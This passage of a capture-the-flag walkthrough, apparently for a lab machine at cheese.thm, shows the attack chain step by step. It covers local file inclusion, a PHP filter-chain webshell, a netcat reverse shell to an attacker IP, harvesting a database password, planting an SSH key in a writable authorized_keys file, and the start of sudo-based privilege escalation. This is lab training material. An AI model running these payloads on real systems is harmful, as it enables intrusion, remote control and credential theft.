message. Here we can see that php filter is passed to the file parameter.\nBurp-suite: cheese.thm/secret-script.php When intercepting the request using burpsuite, we can see that secret-script.php is getting the data of a file supersecretadminpanel.html using parameter file. Lets try to do LFI.\nLFI POC LFI is possible in the web app.\nroot:x:0:0:root:/root:/bin/bash comte:x:1000:1000:comte:/home/comte:/bin/bash We got to know that there is a user comte in this machine. Lets try to get RCE using PHP filter in LFI.\nResources: LFI2RCE via PHP filters | Hacktricks , php_filter_chain_generator .\n$ git clone https://github.com/synacktiv/php_filter_chain_generator $ cd php_filter_chain_generator $ python3 php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39; [+] The following gadget chain will generate the following code : \u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt; (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4) php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp $ curl \u0026#39;http://cheese.thm/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\u0026amp;cmd=id\u0026#39; --output - uid=33(www-data) gid=33(www-data) groups=33(www-data) � P�������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@C������\u0026gt;==�@ Here our payload is \u0026lt;?php system($_GET[\u0026quot;cmd\u0026quot;]);?\u0026gt;, we have cmd parameter in the php shell code. So we can use cmd parameter to execute our shell command ie., cmd=id. Lets use the same method to get the reverse shell.\ncurl \u0026#34;http://cheese.thm/secret-script.php?file=$(python3 php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39; | grep php://)\u0026amp;cmd=id\u0026#34; --output - This simplified command giving result for all shell commands, jus by chainging cmd parameter\u0026rsquo;s value.\ncurl \u0026#34;http://cheese.thm/secret-script.php?file=$(python3 php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39; | grep php://)\u0026amp;cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20$attacker_ip%201234%20%3E%2Ftmp%2Ff\u0026#34; --output - We have replace the id with reverseshell command. and got reverse shell by executing it in port 1234.\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z #(Ctrl+Z) stty raw -echo \u0026amp;\u0026amp; fg export TERM=xterm Got stable shell by running above commands.\nShell as comte www-data@cheesectf:/var/www/html$ grep \u0026#39;\u0026#34;;\u0026#39; /var/www/html/login.php $servername = \u0026#34;localhost\u0026#34;; $user = \u0026#34;comte\u0026#34;; $password = \u0026#34;VeryCheesyPassword\u0026#34;; $dbname = \u0026#34;users\u0026#34;; We got database information from `/var/www/html/login.php.\nlinpeas ╔══════════╣ Processes, Cron \u0026amp; Services [+] Cleaned processes root 699 0.0 0.0 6972 3364 ? Ss 09:51 0:00 /bin/bash /usr/local/bin/twist.sh ╔══════════╣ Sudo version ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version Sudo version 1.8.31 ╔══════════╣ Network Information [+] Hostname, hosts and DNS 127.0.1.1 cheesectf nameserver 127.0.0.53 ╔══════════╣ Executing Linux Exploit Suggester ╚ https://github.com/mzet-/linux-exploit-suggester cat: write error: Broken pipe cat: write error: Broken pipe [+] [CVE-2022-2586] nft_object UAF Details: https://www.openwall.com/lists/oss-security/2022/08/29/5 Exposure: probable Tags: [ ubuntu=(20.04) ]{kernel:5.12.13} Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1 Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN) [+] [CVE-2021-4034] PwnKit Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt Exposure: probable Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main [+] [CVE-2021-3156] sudo Baron Samedit Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: probable Tags: mint=19,[ ubuntu=18|20 ], debian=10 Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main [+] [CVE-2021-3156] sudo Baron Samedit 2 Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt Exposure: probable Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10 Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main [+] [CVE-2021-22555] Netfilter heap out-of-bounds write Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html Exposure: probable Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*} Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c Comments: ip_tables kernel module must be loaded [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET) Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/ https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/ Exposure: less probable Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN) [+] [CVE-2017-5618] setuid screen v4.5.0 LPE Details: https://seclists.org/oss-sec/2017/q1/184 Exposure: less probable Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154 ╔══════════╣ Active Ports ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 10 0.0.0.0:4444 0.0.0.0:* tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 511 *:80 *:* ╔══════════╣ Permissions in init, init.d, systemd, and rc.d ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d You have write privileges over /etc/systemd/system/exploit.timer ╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200) ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files /etc/systemd/system/exploit.timer /home/comte/.ssh/authorized_keys ╔══════════╣ Unexpected in root /swap.img Interesting results using linpeas.sh .\nFrom the above results we can see that /home/comte/.ssh/authorized_keys is writable which means, we can add our public to ssh as user comte.\nssh-keygen ssh-keygen -t rsa -f id_rsa -b 4096 -C \u0026#39;\u0026#39; -N \u0026#39;\u0026#39; Run the above command to generate a SSH key pair in local machine.\necho \u0026#39;contents_of_id_rsa.pub\u0026#39; \u0026gt; /home/comte/.ssh/authorized_keys Run the above command in remote machine. This will make the key trusted for ssh connection.\nssh comte@cheese.thm -i id_rsa Running the above command we got ssh connection as user comte.\ncomte@cheesectf:~$ cat user.txt ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀ ⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇ ⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇ ⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇ ⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇ ⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇ ⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇ ⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇ ⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃ ⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀ ⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ THM{REDACTED} We got our first flag here.\nPrivilege Escalation comte@cheesectf:~$ sudo -l User comte may run the following commands on cheesectf: (ALL) NOPASSWD: /bin/systemctl daemon-reload (ALL) NOPASSWD: 